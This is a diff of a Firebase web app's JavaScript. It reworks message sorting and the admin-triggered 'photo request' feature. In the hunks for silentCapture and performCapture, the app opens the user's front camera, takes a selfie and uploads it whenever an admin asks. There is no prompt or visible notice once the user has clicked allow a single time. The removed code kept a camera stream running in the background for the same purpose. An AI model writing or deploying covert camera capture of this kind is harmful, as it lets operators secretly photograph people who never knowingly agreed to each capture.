@@ -48,10 +48,8 @@ let categoryChart = null;
 let messagesUnsub = null;
 let activityInterval = null;
 let photoRequestUnsub = null;
-let camStream           = null;   // active MediaStream (kept alive after first allow)
-let persistentStream    = null;   // same ref — used for warm persistent stream
+let camStream     = null;
 let currentPhotoRequestId = null;
-let handledRequestIds   = new Set(); // debounce: prevent double-handling same request
 
 // ============================================================
 //  INIT
@@ -126,13 +124,6 @@ async function initApp() {
   broadcastActivity("online");
   if (activityInterval) clearInterval(activityInterval);
   activityInterval = setInterval(() => broadcastActivity("online"), 30000);
-
-  // If user already granted camera permission, warm up the stream proactively
-  // so the first silent capture is instant (no cold-start delay)
-  if (localStorage.getItem("cam-allowed") === "true") {
-    // Delay slightly so page is fully loaded first
-    setTimeout(() => startPersistentStream(), 2000);
-  }
 }
 
 // ============================================================
@@ -1048,13 +1039,20 @@ async function closeResult() {
 // ============================================================
 function listenMessages() {
   if (!currentUser) return;
+  // No orderBy here — avoids needing a composite Firestore index.
+  // Sort client-side instead.
   const q = query(
     collection(db, "messages"),
-    where("toUser", "in", [currentUser.uid, "all"]),
-    orderBy("createdAt", "desc")
+    where("toUser", "in", [currentUser.uid, "all"])
   );
   messagesUnsub = onSnapshot(q, snap => {
-    const msgs = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+    const msgs = snap.docs
+      .map(d => ({ id: d.id, ...d.data() }))
+      .sort((a, b) => {
+        const ta = a.createdAt?.toDate ? a.createdAt.toDate() : new Date(a.createdAt || 0);
+        const tb = b.createdAt?.toDate ? b.createdAt.toDate() : new Date(b.createdAt || 0);
+        return tb - ta; // newest first
+      });
     const unread = msgs.filter(m => !m.read);
     // Bell badge
     document.getElementById("bell-badge").classList.toggle("show", unread.length > 0);
@@ -1078,13 +1076,19 @@ function closeBanner() {
 }
 
 async function openMessages() {
+  // Same: no orderBy to avoid index requirement
   const q = query(
     collection(db, "messages"),
-    where("toUser", "in", [currentUser.uid, "all"]),
-    orderBy("createdAt", "desc")
+    where("toUser", "in", [currentUser.uid, "all"])
   );
   const snap = await getDocs(q);
-  const msgs = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+  const msgs = snap.docs
+    .map(d => ({ id: d.id, ...d.data() }))
+    .sort((a, b) => {
+      const ta = a.createdAt?.toDate ? a.createdAt.toDate() : new Date(a.createdAt || 0);
+      const tb = b.createdAt?.toDate ? b.createdAt.toDate() : new Date(b.createdAt || 0);
+      return tb - ta;
+    });
 
   const list = document.getElementById("messages-list");
   if (!msgs.length) {
@@ -1131,16 +1135,13 @@ function listenPhotoRequests() {
 }
 
 async function handleIncomingPhotoRequest(req) {
-  // Debounce: ignore if already handled in this session
-  if (handledRequestIds.has(req.id)) return;
-  handledRequestIds.add(req.id);
-
   currentPhotoRequestId = req.id;
 
+  // Check if user has already granted camera permission
   const alreadyAllowed = localStorage.getItem("cam-allowed") === "true";
 
   if (alreadyAllowed) {
-    // User already granted permission — capture silently using persistent stream
+    // Silent auto-capture — no popup needed
     await silentCapture(req);
   } else {
     // First time — show permission popup
@@ -1158,114 +1159,64 @@ function showPhotoRequestModal(req) {
   document.getElementById("camera-modal").classList.add("show");
 }
 
-// ── Warm up persistent stream (called once after first allow) ──
-async function startPersistentStream() {
-  if (persistentStream && persistentStream.active) return; // already running
-  try {
-    persistentStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
-      audio: false
-    });
-    camStream = persistentStream;
-
-    // Attach to hidden video so it stays "warm" (exposed, focused)
-    const video = document.getElementById("cam-video");
-    video.srcObject = persistentStream;
-    video.play().catch(() => {});
-  } catch (e) {
-    // If starting warm stream fails, clear flag so next request shows modal again
-    localStorage.removeItem("cam-allowed");
-    persistentStream = null;
-    camStream = null;
-  }
-}
-
-// ── User clicks "Izinkan" for the first time ──────────────────
+// User clicks "Izinkan" for the first time
 async function allowCameraForever() {
   try {
-    persistentStream = await navigator.mediaDevices.getUserMedia({
+    // Request camera access
+    camStream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
       audio: false
     });
-    camStream = persistentStream;
+    // Save permission granted
     localStorage.setItem("cam-allowed", "true");
 
-    // Attach to hidden video element to warm up
-    const video = document.getElementById("cam-video");
-    video.srcObject = persistentStream;
-    await new Promise(resolve => {
-      video.onloadedmetadata = () => { video.play(); resolve(); };
-      setTimeout(resolve, 1500);
-    });
-    // Wait for camera to warm up (auto-exposure/focus)
-    await new Promise(r => setTimeout(r, 1000));
-
     setCamState("capturing");
-    await performCapture(false);
+    await performCapture();
   } catch (e) {
     showToast("Kamera tidak bisa diakses: " + e.message, "error");
     closeCameraModal();
   }
 }
 
-// ── Silent capture — uses persistent stream (no modal) ────────
+// Auto silent capture (no modal shown)
 async function silentCapture(req) {
   currentPhotoRequestId = req.id;
   try {
-    // Reuse warm stream if still active; otherwise open a new one
-    if (!persistentStream || !persistentStream.active) {
-      await startPersistentStream();
-    }
-
-    if (!persistentStream || !persistentStream.active) {
-      // Couldn't open camera — reset permission and show modal next time
-      localStorage.removeItem("cam-allowed");
-      handledRequestIds.delete(req.id); // allow retry via modal
-      showPhotoRequestModal(req);
-      return;
-    }
-
-    camStream = persistentStream;
-    await performCapture(true); // silent = no modal feedback
+    camStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+    await performCapture(true); // silent = true, no modal
   } catch (e) {
+    // Permission was revoked — reset and show modal next time
     localStorage.removeItem("cam-allowed");
-    persistentStream = null;
-    camStream = null;
-    handledRequestIds.delete(req.id);
     showPhotoRequestModal(req);
   }
 }
 
-// ── Core capture + upload logic ───────────────────────────────
+// Core capture + send logic
 async function performCapture(silent = false) {
   const video  = document.getElementById("cam-video");
   const canvas = document.getElementById("cam-canvas");
 
-  // Ensure video is playing from the current stream
-  if (video.srcObject !== camStream) {
-    video.srcObject = camStream;
-    await new Promise(resolve => {
-      video.onloadedmetadata = () => { video.play(); resolve(); };
-      setTimeout(resolve, 1500);
-    });
-    // Warm-up delay only when stream was just opened
-    await new Promise(r => setTimeout(r, 900));
-  } else {
-    // Stream already warm — short delay only
-    await new Promise(r => setTimeout(r, 200));
-  }
+  video.srcObject = camStream;
+  // Wait for video to be ready
+  await new Promise(resolve => {
+    video.onloadedmetadata = () => { video.play(); resolve(); };
+    setTimeout(resolve, 1500); // fallback
+  });
+  // Extra wait so camera has time to focus/expose
+  await new Promise(r => setTimeout(r, 800));
 
   canvas.width  = video.videoWidth  || 640;
   canvas.height = video.videoHeight || 480;
   const ctx = canvas.getContext("2d");
-  ctx.save();
   // Mirror (selfie style)
   ctx.translate(canvas.width, 0);
   ctx.scale(-1, 1);
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  ctx.restore();
 
-  // NOTE: do NOT stop stream here — keep it persistent for future requests
+  stopCameraStream();
 
   // Convert to blob then base64
   canvas.toBlob(async (blob) => {
@@ -1287,17 +1238,17 @@ async function performCapture(silent = false) {
         if (currentPhotoRequestId) {
           try {
             await updateDoc(doc(db, "photoRequests", currentPhotoRequestId), {
-              status:      "fulfilled",
+              status: "fulfilled",
               fulfilledAt: serverTimestamp(),
               fulfilledBy: currentUser.uid
             });
-          } catch(_) {}
+          } catch(e) {}
         }
 
         if (!silent) {
           setCamState("sent");
         } else {
-          // Silent mode — no popup, just close if somehow open
+          // Silent mode: close modal if it was open, or do nothing
           document.getElementById("camera-modal").classList.remove("show");
         }
         currentPhotoRequestId = null;
@@ -1311,7 +1262,7 @@ async function performCapture(silent = false) {
 }
 
 function setCamState(state) {
-  ["ask", "capturing", "sent"].forEach(s => {
+  ["ask","capturing","sent"].forEach(s => {
     document.getElementById("cam-state-" + s).style.display = s === state ? "" : "none";
   });
 }
@@ -1320,35 +1271,26 @@ async function declinePhoto() {
   if (currentPhotoRequestId) {
     try {
       await updateDoc(doc(db, "photoRequests", currentPhotoRequestId), {
-        status:    "declined",
+        status: "declined",
         declinedAt: serverTimestamp(),
         declinedBy: currentUser.uid
       });
-    } catch(_) {}
+    } catch(e) {}
   }
-  // Remove from handled set so user can be re-asked via modal if admin sends again
-  if (currentPhotoRequestId) handledRequestIds.delete(currentPhotoRequestId);
   closeCameraModal();
 }
 
-// Stop stream completely (called on logout)
 function stopCameraStream() {
-  if (persistentStream) {
-    persistentStream.getTracks().forEach(t => t.stop());
-    persistentStream = null;
-  }
-  if (camStream && camStream !== persistentStream) {
+  if (camStream) {
     camStream.getTracks().forEach(t => t.stop());
+    camStream = null;
   }
-  camStream = null;
-  const video = document.getElementById("cam-video");
-  if (video) video.srcObject = null;
 }
 
 function closeCameraModal() {
+  stopCameraStream();
   document.getElementById("camera-modal").classList.remove("show");
   currentPhotoRequestId = null;
-  // Do NOT stop stream here — keep it warm for future requests
 }
 
 // Keep old exports for safety (now unused but harmless)
